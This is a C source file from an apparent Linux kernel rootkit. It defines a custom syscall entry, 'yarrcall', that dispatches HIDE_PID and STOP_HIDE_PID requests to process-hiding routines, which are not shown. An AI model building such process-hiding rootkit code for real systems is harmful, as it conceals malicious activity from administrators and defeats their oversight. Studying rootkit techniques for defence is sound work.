#include "yarrcall.h"
#include "log.h"
#include "hidepid.h"

// A map that maps the integer value of svc into a string with its name.
// Note that enum YARRCALL_VECTORS starts at 1, hence the first NULL.
const char *__YARRCALL_VECTORS_MAP[] = {
    NULL,           
    "HIDE_PID",
    "STOP_HIDE_PID"
};

static const char * __enum2str(enum YARRCALL_VECTORS svc) {
    switch (svc) {
        case HIDE_PID:
            return __YARRCALL_VECTORS_MAP[HIDE_PID];

        case STOP_HIDE_PID:
            return __YARRCALL_VECTORS_MAP[STOP_HIDE_PID];

        default:
            return NULL;
    }
}

asmlinkage long entry_yarrcall(struct pt_regs *regs) {
    return yarrcall((int)(regs->di), (void *)(regs->si));
}

long yarrcall(int svc, YarrCallArgs_t __user *args) {
    int err;

    yarr_log("Requested service %s", __enum2str(svc));
    switch (svc) {
        case HIDE_PID:
            err = hide_pid(args->hidepid_args.pid);
            break;

        case STOP_HIDE_PID:
            err = stop_hide_pid(args->hidepid_args.pid);
            break;

        default:
            yarr_log("Yarrcall requested %d not recognized", svc);
            err = -1;
    }

    return err;
}


